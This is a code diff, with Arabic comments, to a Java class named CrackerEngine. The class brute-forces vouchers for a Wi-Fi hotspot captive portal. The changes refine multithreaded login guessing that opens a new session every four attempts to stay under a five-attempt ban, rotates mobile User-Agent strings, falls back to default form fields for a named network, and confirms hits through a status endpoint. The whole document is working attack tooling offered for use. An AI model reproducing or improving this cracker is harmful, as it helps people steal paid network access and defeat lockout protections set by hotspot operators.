@@ -14,7 +14,6 @@ public class CrackerEngine {
         void onFound(String voucher, String status);
     }
 
-    // ⚡ 4 محاولات فقط لكل جلسة (نتجنب الحظر بعد 5)
     private static final int ATTEMPTS_PER_SESSION = 4;
     
     private final Listener listener;
@@ -74,7 +73,6 @@ public class CrackerEngine {
         try {
             log("▶ بدء التخمين المحسّن");
             log("  عدد الخيوط: " + threads);
-            log("  جلسة جديدة كل " + ATTEMPTS_PER_SESSION + " محاولات (تجنب الحظر)");
 
             log("→ تسجيل خروج...");
             try {
@@ -93,7 +91,7 @@ public class CrackerEngine {
                     Thread t = new Thread(() -> workerLoop(wid), "Worker-" + wid);
                     workers.add(t);
                     t.start();
-                    sleep(200); // تشغيل متدرج
+                    sleep(200);
                 }
             }
             log("✓ يعمل الآن " + threads + " خيوط...");
@@ -111,16 +109,15 @@ public class CrackerEngine {
 
     private void workerLoop(int id) {
         while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
-            // 1. جلسة جديدة
             Map<String, String> cookies = new HashMap<>();
-            Map<String, String> template = openSession(cookies);
+            
+            // فتح جلسة جديدة مع طباعة الأخطاء
+            Map<String, String> template = openSession(cookies, id);
             if (template == null) {
                 sleep(1000);
                 continue;
             }
 
-            // 2. إرسال 4 محاولات في هذه الجلسة (أقل من 5 لتجنب الحظر)
-            boolean sessionBurned = false;
             for (int i = 0; i < ATTEMPTS_PER_SESSION && !stopped.get() && !found.get(); i++) {
                 if (done.get() >= maxAttempts) return;
                 
@@ -137,8 +134,7 @@ public class CrackerEngine {
                 if (r.busy) {
                     log("[W" + id + "]   ⏳ مشغول — تبديل الجلسة");
                     sleep(retryDelay);
-                    sessionBurned = true;
-                    break;
+                    break; // كسر الحلقة لفتح جلسة جديدة
                 }
                 
                 if (r.success) {
@@ -155,40 +151,63 @@ public class CrackerEngine {
                 sleep(pauseMs + rng.nextInt(100));
             }
             
-            // 3. التخلص من الجلسة، استراحة قصيرة
-            if (!sessionBurned) sleep(300 + rng.nextInt(300));
+            sleep(200 + rng.nextInt(300));
         }
     }
 
-    private Map<String, String> openSession(Map<String, String> cookies) {
+    private Map<String, String> openSession(Map<String, String> cookies, int wid) {
         if (stopped.get()) return null;
         String ua = ua();
         try {
-            // الخطوة 1: صفحة البداية
             HttpURLConnection c1 = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
             c1.setConnectTimeout(5000); c1.setReadTimeout(5000);
             c1.setRequestProperty("User-Agent", ua);
-            c1.setRequestProperty("Accept-Language", "ar,en;q=0.9");
             c1.getResponseCode();
             extractCookies(c1, cookies);
             c1.disconnect();
             if (stopped.get()) return null;
 
-            // الخطوة 2: صفحة الفورم
             HttpURLConnection c2 = (HttpURLConnection) new URL(loginUrl).openConnection();
             c2.setConnectTimeout(5000); c2.setReadTimeout(5000);
             c2.setRequestProperty("User-Agent", ua);
-            c2.setRequestProperty("Accept-Language", "ar,en;q=0.9");
             String ck = cookiesStr(cookies);
             if (!ck.isEmpty()) c2.setRequestProperty("Cookie", ck);
-            String html = read(c2.getInputStream());
+            
+            int code2 = c2.getResponseCode();
+            InputStream is2 = (code2 >= 400) ? c2.getErrorStream() : c2.getInputStream();
+            String html = "";
+            if (is2 != null) html = read(is2);
             extractCookies(c2, cookies);
             c2.disconnect();
 
-            return extractFields(html);
+            return extractFields(html, wid);
         } catch (Exception e) {
+            if (!stopped.get()) log("[W" + wid + "] ⚠ خطأ في الاتصال: " + e.getMessage());
             return null;
         }
+    }
+
+    private Map<String, String> extractFields(String html, int wid) {
+        Map<String, String> fields = new LinkedHashMap<>();
+        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
+            "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
+            java.util.regex.Pattern.CASE_INSENSITIVE);
+        java.util.regex.Matcher m = p.matcher(html);
+        while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
+        
+        // إذا لم يجد حقول، استخدم الحقول الافتراضية (لشبكة sh.com وغيرها)
+        if (fields.isEmpty()) {
+            log("[W" + wid + "] ℹ لا يوجد <form> — استخدام الحقول الافتراضية");
+            fields.put("username", "");
+            fields.put("password", "");
+            fields.put("dst", baseUrl + "/");
+            fields.put("popup", "true");
+        } else {
+            fields.putIfAbsent("username", "");
+            fields.putIfAbsent("password", "");
+            fields.putIfAbsent("dst", baseUrl + "/");
+        }
+        return fields;
     }
 
     private Result tryLogin(Map<String, String> cookies, Map<String, String> template, String voucher) {
@@ -206,9 +225,7 @@ public class CrackerEngine {
             c.setConnectTimeout(8000); c.setReadTimeout(8000);
             c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
             c.setRequestProperty("User-Agent", ua);
-            c.setRequestProperty("Accept-Language", "ar,en;q=0.9");
             c.setRequestProperty("Referer", loginUrl);
-            c.setRequestProperty("Origin", baseUrl);
             String ck = cookiesStr(cookies);
             if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);
 
@@ -240,48 +257,31 @@ public class CrackerEngine {
             
             if (low.contains("invalid") || low.contains("error") 
                 || low.contains("wrong") || low.contains("denied")) {
-                String msg = extractErr(body);
-                return Result.bad(msg != null ? msg : "invalid");
+                return Result.bad("خاطئ");
             }
 
-            // فقط إذا لم يكن هناك خطأ صريح، نفحص الحالة
-            if (code == 302 || code == 303 || code == 200) {
-                sleep(80);
-                HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
-                c4.setConnectTimeout(4000); c4.setReadTimeout(4000);
-                c4.setRequestProperty("User-Agent", ua);
-                String ck2 = cookiesStr(cookies);
-                if (!ck2.isEmpty()) c4.setRequestProperty("Cookie", ck2);
-                String statusBody = read(c4.getInputStream());
-                c4.disconnect();
+            // فحص الحالة
+            sleep(80);
+            HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
+            c4.setConnectTimeout(4000); c4.setReadTimeout(4000);
+            c4.setRequestProperty("User-Agent", ua);
+            String ck2 = cookiesStr(cookies);
+            if (!ck2.isEmpty()) c4.setRequestProperty("Cookie", ck2);
+            String statusBody = read(c4.getInputStream());
+            c4.disconnect();
 
-                try {
-                    JSONObject o = new JSONObject(statusBody);
-                    String li = o.optString("logged_in", "").toLowerCase();
-                    String un = o.optString("username", "").trim();
-                    if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
-                        return Result.ok(statusBody);
-                } catch (Exception e) {}
-            }
+            try {
+                JSONObject o = new JSONObject(statusBody);
+                String li = o.optString("logged_in", "").toLowerCase();
+                String un = o.optString("username", "").trim();
+                if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
+                    return Result.ok(statusBody);
+            } catch (Exception e) {}
             
             return Result.bad(null);
         } catch (Exception e) {
             return Result.bad("network: " + e.getMessage());
         }
-    }
-
-    private Map<String, String> extractFields(String html) {
-        Map<String, String> fields = new LinkedHashMap<>();
-        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
-            "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
-            java.util.regex.Pattern.CASE_INSENSITIVE);
-        java.util.regex.Matcher m = p.matcher(html);
-        while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
-        if (fields.isEmpty()) return null;
-        fields.putIfAbsent("username", "");
-        fields.putIfAbsent("password", "");
-        fields.putIfAbsent("dst", baseUrl + "/");
-        return fields;
     }
 
     private static class Result {
@@ -337,19 +337,11 @@ public class CrackerEngine {
         return sb.toString();
     }
 
-    private String extractErr(String html) {
-        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
-            "class=[\"'][^\"']*(?:error|alert|fail|warn)[^\"']*[\"'][^>]*>([^<]+)<",
-            java.util.regex.Pattern.CASE_INSENSITIVE);
-        java.util.regex.Matcher m = p.matcher(html);
-        return m.find() ? m.group(1).trim() : null;
-    }
-
     private String ua() {
         String[] a = {
-            "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/115.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 Chrome/110.0 Mobile Safari/537.36"
         };
         return a[rng.nextInt(a.length)];
     }
